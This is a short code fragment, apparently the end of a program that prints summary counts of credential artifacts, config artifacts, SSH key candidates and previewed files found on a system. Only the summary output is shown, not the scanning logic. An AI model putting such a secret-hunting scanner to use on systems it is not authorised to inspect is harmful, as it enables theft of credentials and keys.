        "[i] Summary: credential artifacts=%d, config artifacts=%d, ssh key candidates=%d, previews=%d, preview errors=%d, truncated previews=%d\n",
        results.credential_hits,
        results.config_hits,
        results.ssh_key_hits,
        results.previewed_files,
        results.preview_errors,
        results.truncated_previews
    );
}
